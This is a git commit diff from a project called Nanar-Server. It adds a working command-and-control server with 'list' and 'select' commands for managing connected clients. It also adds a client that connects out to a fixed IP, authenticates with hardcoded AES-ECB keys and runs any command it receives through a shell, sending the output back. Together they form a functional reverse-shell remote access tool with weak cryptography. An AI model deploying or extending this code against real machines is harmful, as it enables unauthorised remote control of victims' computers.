62cce64778e432b558ef062adec4ad303c205b77
Hussien_Shnn <shnnhussie@gmail.com>
2025-05-20 07:33:24 +0200

    create server with help command and list comnand

--- Nanar-Server/ServerFinal.py
+++ Nanar-Server/ServerFinal.py
@@ -2,135 +2,130 @@ import socket
 import sys
 import threading
 import time
-
+from Crypto.Cipher import AES
 
 connections = []
 addresses = []
-Shutdown_Flag=threading.Event()
+Shutdown_Flag = threading.Event()
 global current_client
 current_client = None
 conn_lock = threading.Lock()
+key = "password"
+aes_key = "secret123"
 
+def pad(text):
+    while len(text) % 16 != 0:
+        text += ' '
+    return text
 
+def decrypt(encrypted_bytes, key):
+    key = pad(key)[:16].encode()
+    cipher = AES.new(key, AES.MODE_ECB)
+    decrypted_text = cipher.decrypt(encrypted_bytes).decode().rstrip()
+    return decrypted_text
 
 def sock():
     try:
         global s
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         print("Listening on port:9999")
-        s.bind(("0.0.0.0",9999))
+        s.bind(("0.0.0.0", 9999))
         s.listen(5)
         return s
-        
+
     except KeyboardInterrupt:
         print("server shutting down!\n")
         s.close()
         sys.exit(1)
 
-
-
 def Connection_Handling():
-
     while not Shutdown_Flag.is_set():
         try:
-            conn,addr=s.accept()
-            with conn_lock:
-                addresses.append(addr)
-                connections.append(conn)
-            print(f"Established connection with {addr[0]}:{addr[1]}\n")
-        except (OSError,socket.error):
+            conn, addr = s.accept()
+            conn.send(b"server up!")
+            client_key = conn.recv(1024)
+            try:
+                decrypted_key = decrypt(client_key, aes_key)
+            except Exception as e:
+                print(f"Decryption failed from {addr}: {e}")
+                conn.close()
+                continue
+
+            if decrypted_key == key:
+                with conn_lock:
+                    addresses.append(addr)
+                    connections.append(conn)
+                print(f"Established connection with {addr[0]}:{addr[1]}\n")
+            else:
+                print(f"Invalid key from {addr}")
+                conn.close()
+        except (OSError, socket.error):
             break
-
-
 
 def turtle():
     global current_client
     while not Shutdown_Flag.is_set():
-
         try:
-            if (current_client):
-                prompt=f"{current_client} >"
-            else:
-                prompt="turtle >"    
-            cmd=input(prompt)
+            prompt = f"{current_client} > " if current_client else "turtle > "
+            cmd = input(prompt)
 
-            if (not cmd):
+            if not cmd:
                 continue
-
-            elif (cmd=="list"):
+            elif cmd == "list":
                 list_connections()
-
-            elif (cmd=="exit"):
+            elif cmd == "exit":
                 Shutdown_Flag.set()
-
             elif "select" in cmd:
                 try:
-                    target=cmd.replace("select ","")
-                    target=int(target)
-                    conn=connections[target]
-                    current_client=addresses[target]
+                    target = int(cmd.replace("select ", ""))
+                    conn = connections[target]
+                    current_client = addresses[target]
                 except:
-                    print("Invalid Client Index\n")  
-            
-            elif (current_client):
+                    print("Invalid Client Index\n")
+            elif current_client:
                 with conn_lock:
-                    I=addresses.index(current_client)
-                    conn=connections[I]
-                    send_commands(conn,cmd)
-                
-
-
+                    i = addresses.index(current_client)
+                    conn = connections[i]
+                    send_commands(conn, cmd)
             else:
                 print("Client not found!\n")
-
-            
-        
         except (EOFError, KeyboardInterrupt):
             print("\nShutting down command interface...")
             Shutdown_Flag.set()
-            break  
-
+            break
 
 def list_connections():
     print("--- ACTIVE CLIENTS ---")
     for i, addr in enumerate(addresses):
         print(f"{i}     {addr[0]}    {addr[1]}")
-   
-
-
 
 def send_commands(conn, cmd):
     try:
         conn.send(cmd.encode())
-        client_response=conn.recv(50000).decode()
+        client_response = conn.recv(50000).decode()
         print(client_response, end='')
     except (ConnectionResetError, BrokenPipeError):
         print("Client disconnected!")
         with conn_lock:
             if conn in connections:
                 index = connections.index(conn)
+                global current_client
+                if current_client == addresses[index]:
+                    current_client = None
                 del connections[index]
                 del addresses[index]
-                global current_client
-                if current_client == addresses[index][0]:
-                    current_client = None
     except KeyboardInterrupt:
-        raise  
-
+        raise
 
 def cleanup(sock):
-    with conn_lock: 
+    with conn_lock:
         for conn in connections:
             conn.close()
     sock.close()
 
-
-
 def main():
-
-    s=sock()
-
+    s = sock()
     conn_thread = threading.Thread(target=Connection_Handling)
     conn_thread.start()
     try:
@@ -140,5 +135,3 @@ def main():
         cleanup(s)
 
 main()
-    
-
--- Nanar-Server/client.py
+++ Nanar-Server/client.py
@@ -1,23 +1,48 @@
 import socket
 import os
 import subprocess
+from Crypto.Cipher import AES
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-host = '127.0.0.1'
+def pad(text):
+    while len(text) % 16 != 0:
+        text += ' '
+    return text
+
+def encrypt(text, key):
+    key = pad(key)[:16].encode()
+    cipher = AES.new(key, AES.MODE_ECB)
+    padded_text = pad(text)
+    encrypted_bytes = cipher.encrypt(padded_text.encode())
+    return encrypted_bytes
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = '192.168.137.138'
 port = 9999
+key = "secret123"
 
 s.connect((host, port))
 
 while True:
     data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+    command = data.decode("utf-8")
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+    if command == "server up!":
+        s.send(encrypt("password", key))
+
+    elif command[:2] == 'cd':
+        try:
+            os.chdir(command[3:])
+            s.send(b"Changed directory.")
+        except Exception as e:
+            s.send(str(e).encode())
+
+    elif command == "exit":
+        s.close()
+        break
+
+    elif len(command) > 0:
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
+        output_str = output_byte.decode("utf-8")
         currentWD = os.getcwd() + "> "
         s.sendall(str.encode(output_str + currentWD))
-
-        print(output_str)
